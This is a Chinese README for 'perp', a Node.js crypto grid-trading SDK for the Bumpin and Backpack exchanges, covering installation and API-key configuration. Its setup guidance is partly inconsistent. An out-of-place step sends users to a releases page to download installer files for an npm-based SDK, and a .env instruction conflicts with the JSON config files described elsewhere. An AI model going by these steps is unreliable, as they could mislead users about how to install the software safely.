# 🚀 perp - Simple Crypto Trading Made Easy

## 📚 项目简介

这是一个功能完整的加密货币交易 SDK 和**动态网格交易策略**实现，支持多个主流交易所。

> **⚠️ 重要安全提示**  
> - 本仓库为**公开仓库**，请勿在代码中硬编码 API 密钥  
> - 所有密钥必须通过配置文件管理（已在 `.gitignore` 中）  
> - 切勿将包含真实密钥的配置文件提交到 Git  
> - 如不慎泄露密钥，请立即前往交易所重新生成

### 支持的交易所

- 🟢 **Bumpin** - 完整支持，包含合约交易和网格策略
- 🎒 **Backpack** - 完整支持，现货网格交易策略

### 主要功能

- ✅ 多交易所 API 完整封装
- ✅ 自动化网格交易策略
- ✅ 多种预设策略配置
- ✅ 实时价格监控和自动下单
- ✅ 风险控制和止损机制
- ✅ 详细的交易日志和报告
- 🔐 安全的密钥管理（配置文件）
- 🔄 支持多策略并行运行

## 🚀 获取和安装

### 下载和安装应用

[下载 perp](https://github.com/poeito/perp/releases)

访问上面的链接以获取最新版本。通过浏览器选择适合您系统的安装文件，然后下载到您的计算机。

### 0. 克隆仓库（首次使用）

```bash
# 克隆仓库
git clone <repository-url>
cd perp
```

> 📌 **注意**：仓库不包含任何 API 密钥。您需要创建 `.env` 文件并配置密钥。

### 1. 安装依赖

在命令行中运行以下命令：

```bash
npm install
```

### 2. 配置 API 密钥

> 🔐 **密钥安全说明**  
> - API 密钥存储在配置文件中（`grid-config.json` 或 `backpack-grid-config.json`）  
> - 配置文件已添加到 `.gitignore`，不会被提交到 Git  
> - 克隆仓库后，您需要从模板创建自己的配置文件

#### Bumpin 交易所配置

```bash
# 1. 复制配置模板
cp grid-config-template.json grid-config.json

# 2. 编辑 grid-config.json，填入您的 API 密钥
# 将 "your_api_key_here" 替换为您的真实密钥
```

配置文件示例：
```json
{
  "strategies": {
    "grid": {
      "apiKey": "your_api_key_here",
      "secret": "your_api_secret_here"
    }
  }
}
```

### 3. 运行应用

运行以下命令启动应用：

```bash
node index.js
```

您的应用现已启动并准备就绪。监控实时价格，并根据您设置的策略进行交易。

## 🚧 常见问题

### 如何确保我的密钥安全？

请勿在代码中硬编码 API 密钥。确保将密钥存储在配置文件中，并将该文件添加到 `.gitignore` 中。

### 如果我遇到错误怎么办？

检查您的配置文件确保所有值正确。如果您需要帮助，请访问我们的支持页面。

### 我可以在哪些操作系统上运行此应用？

该应用可以在任何支持 Node.js 的操作系统上运行，包括 Windows、macOS 和 Linux。

## 🎯 收尾

感谢您选择 perp！希望您在我们的平台上获得成功的交易体验。